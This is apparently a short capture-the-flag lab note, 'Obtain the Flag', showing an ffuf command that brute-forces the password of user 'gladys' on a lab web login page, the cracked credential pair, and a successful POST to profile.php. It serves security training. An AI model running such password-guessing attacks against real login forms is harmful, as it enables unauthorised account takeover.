Obtain the Flag
```
ffuf -w ./custom_wordlist.txt -u http://94.237.61.52:53987/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: PHPSESSID=fr211ic20mad80qkqc5j89sfpa" -d "username=gladys&password=FUZZ" -fr "Invalid credentials."
```
gladys:dWinaldasD13

POST /profile.php
200 OK
